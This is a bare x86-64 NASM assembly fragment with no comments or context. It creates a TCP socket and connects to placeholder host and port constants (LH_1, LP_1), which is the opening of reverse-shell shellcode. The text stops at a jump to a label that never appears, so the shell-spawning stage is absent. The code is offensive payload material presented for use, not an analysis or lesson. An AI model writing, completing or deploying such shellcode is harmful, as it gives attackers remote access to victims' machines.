BITS 64
section .text
global _start
_start:
c1:
push byte 0x29 
pop rax        
push byte 0x2  
pop rdi        
push byte 0x1  
pop rsi        
cdq            
syscall        
xchg rdi, rax 
push rdi
pop rbx
mov dword [rsp-4], LH_1
mov word  [rsp-6], LP_1   
mov byte  [rsp-8], 0x02     
sub rsp, 8                  
push byte 0x2a              
pop rax                     
mov rsi, rsp                
push byte 0x10              
pop rdx                     
syscall                     
cmp rax, -1
jne x
